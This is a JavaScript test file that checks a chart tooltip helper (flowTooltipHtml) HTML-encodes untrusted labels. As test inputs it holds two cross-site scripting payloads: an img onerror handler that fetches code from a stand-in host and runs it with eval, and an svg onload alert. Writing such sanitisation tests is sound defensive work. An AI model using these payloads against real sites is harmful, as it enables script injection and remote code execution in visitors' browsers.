import assert from "node:assert/strict";
import { format } from "echarts/core";
import { flowTooltipHtml } from "./flowTooltip.ts";

const payload = `<img src=x id=pwned onerror="fetch('//e.tld/p').then(r=>r.text()).then(eval)">`;
const node = flowTooltipHtml("node", "", "", payload, `12 € · 10%`);
const edge = flowTooltipHtml("edge", payload, `"><svg/onload=alert(1)>`, "", "12 €");

assert.equal(node.includes("<img"), false);
assert.equal(node.includes("<br/>"), true);
assert.equal(node.split("<br/>").length, 2);
assert.equal(node.startsWith(format.encodeHTML(payload)), true);
assert.equal(edge.includes("<svg"), false);
assert.equal(edge.includes(format.encodeHTML(payload)), true);
assert.equal(edge.includes(format.encodeHTML(`"><svg/onload=alert(1)>`)), true);
assert.equal((node.match(/</g) || []).length, 1);
assert.equal((edge.match(/</g) || []).length, 1);
